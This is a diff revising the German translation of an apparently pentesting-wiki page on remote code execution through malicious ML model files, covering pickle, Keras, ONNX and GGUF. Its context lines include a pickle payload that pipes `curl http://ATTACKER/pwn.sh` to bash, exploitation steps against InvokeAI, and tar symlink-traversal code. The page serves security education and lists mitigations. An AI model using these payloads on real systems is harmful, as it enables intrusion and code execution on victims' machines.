@@ -1,4 +1,4 @@
-# Modelle RCE
+# Models RCE
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -13,14 +13,14 @@ Zum Zeitpunkt des Schreibens sind dies einige Beispiele für diese Art von Schwa
 | **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Schadhafter Pickle im Modell-Checkpoint führt zur Codeausführung (Umgehung der `weights_only`-Sicherung)                                | |
 | PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + schadhafter Modell-Download verursacht Codeausführung; Java-Deserialisierungs-RCE in der Verwaltungs-API                          | |
 | **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laden des Modells aus YAML verwendet `yaml.unsafe_load` (Codeausführung) <br> Laden des Modells mit **Lambda**-Schicht führt zur Ausführung beliebigen Python-Codes | |
-| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Bearbeitetes `.tflite`-Modell löst ganzzahligen Überlauf aus → Heap-Korruption (potenzielles RCE)                                       | |
+| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Ausgelöstes `.tflite`-Modell verursacht ganzzahlige Überläufe → Heap-Korruption (potenzielles RCE)                                      | |
 | **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Laden eines Modells über `joblib.load` führt zur Ausführung von Pickle mit dem Payload des Angreifers `__reduce__`                       | |
-| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                          | `numpy.load` erlaubte standardmäßig pickled Objektarrays – schadhafter `.npy/.npz` löst Codeausführung aus                               | |
+| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                          | `numpy.load` erlaubte standardmäßig pickled Objektarrays – schadhafter `.npy/.npz`-Datei führt zur Codeausführung                        | |
 | **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Verzeichnisdurchquerung) <br> **CVE-2024-5187** (tar-Durchquerung)                                        | Der externe Gewichts-Pfad des ONNX-Modells kann das Verzeichnis verlassen (beliebige Dateien lesen) <br> Schadhafter ONNX-Modell-Tar kann beliebige Dateien überschreiben (führt zu RCE) | |
-| ONNX Runtime (Designrisiko) | *(Keine CVE)* ONNX benutzerdefinierte Operationen / Kontrollfluss                                                               | Modell mit benutzerdefiniertem Operator erfordert das Laden des nativen Codes des Angreifers; komplexe Modellgraphen missbrauchen Logik, um unbeabsichtigte Berechnungen auszuführen | |
+| ONNX Runtime (Designrisiko) | *(Keine CVE)* ONNX benutzerdefinierte Operationen / Kontrollfluss                                                              | Modell mit benutzerdefiniertem Operator erfordert das Laden des nativen Codes des Angreifers; komplexe Modellgraphen missbrauchen Logik, um unbeabsichtigte Berechnungen auszuführen | |
 | **NVIDIA Triton Server**    | **CVE-2023-31036** (Pfad-Durchquerung)                                                                                       | Verwendung der Modell-Lade-API mit aktiviertem `--model-control` ermöglicht relative Pfad-Durchquerung zum Schreiben von Dateien (z. B. Überschreiben von `.bashrc` für RCE) | |
-| **GGML (GGUF-Format)**      | **CVE-2024-25664 … 25668** (mehrere Heap-Überläufe)                                                                          | Fehlformatierte GGUF-Modell-Datei verursacht Heap-Pufferüberläufe im Parser, was die Ausführung beliebigen Codes auf dem Opfersystem ermöglicht | |
-| **Keras (ältere Formate)**  | *(Keine neue CVE)* Legacy Keras H5-Modell                                                                                     | Schadhafter HDF5 (`.h5`) Modell mit Lambda-Schicht-Code wird beim Laden weiterhin ausgeführt (Keras safe_mode deckt altes Format nicht ab – „Downgrade-Angriff“) | |
+| **GGML (GGUF-Format)**      | **CVE-2024-25664 … 25668** (mehrere Heap-Überläufe)                                                                           | Fehlformatierte GGUF-Modell-Datei verursacht Heap-Pufferüberläufe im Parser, was die Ausführung beliebigen Codes auf dem Opfersystem ermöglicht | |
+| **Keras (ältere Formate)**  | *(Keine neue CVE)* Legacy Keras H5-Modell                                                                                     | Schadhafter HDF5 (`.h5`) Modell mit Lambda-Schicht-Code wird beim Laden weiterhin ausgeführt (Keras safe_mode deckt das alte Format nicht ab – „Downgrade-Angriff“) | |
 | **Andere** (allgemein)      | *Designfehler* – Pickle-Serialisierung                                                                                       | Viele ML-Tools (z. B. pickle-basierte Modellformate, Python `pickle.load`) führen beliebigen Code aus, der in Modell-Dateien eingebettet ist, es sei denn, es gibt Abhilfemaßnahmen | |
 
 Darüber hinaus gibt es einige auf Python-Pickle basierende Modelle wie die von [PyTorch](https://github.com/pytorch/pytorch/security), die verwendet werden können, um beliebigen Code auf dem System auszuführen, wenn sie nicht mit `weights_only=True` geladen werden. Daher könnte jedes auf Pickle basierende Modell besonders anfällig für diese Art von Angriffen sein, auch wenn sie nicht in der obigen Tabelle aufgeführt sind.
@@ -51,8 +51,8 @@ return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))
 with open("payload.ckpt", "wb") as f:
 pickle.dump(Payload(), f)
 ```
-2. Host `payload.ckpt` auf einem HTTP-Server, den Sie kontrollieren (z.B. `http://ATTACKER/payload.ckpt`).
-3. Triggern Sie den anfälligen Endpunkt (keine Authentifizierung erforderlich):
+2. Hoste `payload.ckpt` auf einem HTTP-Server, den du kontrollierst (z.B. `http://ATTACKER/payload.ckpt`).
+3. Trigger den verwundbaren Endpunkt (keine Authentifizierung erforderlich):
 ```python
 import requests
 
@@ -74,16 +74,16 @@ Fertiger Exploit: **Metasploit** Modul `exploit/linux/http/invokeai_rce_cve_2024
 #### Bedingungen
 
 •  InvokeAI 5.3.1-5.4.2 (Scan-Flag standardmäßig **false**)  
-•  `/api/v2/models/install` für den Angreifer erreichbar  
-•  Der Prozess hat Berechtigungen zur Ausführung von Shell-Befehlen  
+•  `/api/v2/models/install` vom Angreifer erreichbar  
+•  Prozess hat Berechtigungen zur Ausführung von Shell-Befehlen  
 
 #### Minderung
 
 * Upgrade auf **InvokeAI ≥ 5.4.3** – der Patch setzt `scan=True` standardmäßig und führt eine Malware-Überprüfung vor der Deserialisierung durch.  
 * Verwenden Sie beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` oder den neuen [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) Helfer.  
-* Erzwingen Sie Zulassungslisten / Signaturen für Modellquellen und führen Sie den Dienst mit minimalen Rechten aus.  
+* Erzwingen Sie Erlauben-Listen / Signaturen für Modellquellen und führen Sie den Dienst mit minimalen Rechten aus.  
 
-> ⚠️ Denken Sie daran, dass **jede** Python-Pickle-basierte Format (einschließlich vieler `.pt`, `.pkl`, `.ckpt`, `.pth` Dateien) von untrusted Quellen grundsätzlich unsicher zu deserialisieren ist.  
+> ⚠️ Denken Sie daran, dass **jede** Python-Pickle-basierte Format (einschließlich vieler `.pt`, `.pkl`, `.ckpt`, `.pth` Dateien) von Natur aus unsicher ist, um von nicht vertrauenswürdigen Quellen deserialisiert zu werden.  
 
 ---
 
@@ -161,11 +161,19 @@ with tarfile.open("symlink_demo.model", "w:gz") as tf:
 tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
 tf.add(PAYLOAD)                      # rides the symlink
 ```
+### Deep-dive: Keras .keras Deserialisierung und Gadget-Suche
+
+Für einen fokussierten Leitfaden zu .keras-Interna, Lambda-Layer RCE, dem Problem mit dem willkürlichen Import in ≤ 3.8 und der Entdeckung von Post-Fix-Gadgets innerhalb der Allowlist, siehe:
+
+{{#ref}}
+../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
+{{#endref}}
+
 ## Referenzen
 
-- [OffSec-Blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
+- [OffSec Blog – "CVE-2024-12029 – InvokeAI Deserialisierung von nicht vertrauenswürdigen Daten"](https://www.offsec.com/blog/cve-2024-12029/)
 - [InvokeAI Patch Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
-- [Rapid7 Metasploit Modul-Dokumentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
+- [Rapid7 Metasploit Modul Dokumentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
 - [PyTorch – Sicherheitsüberlegungen für torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
 
 {{#include ../banners/hacktricks-training.md}}
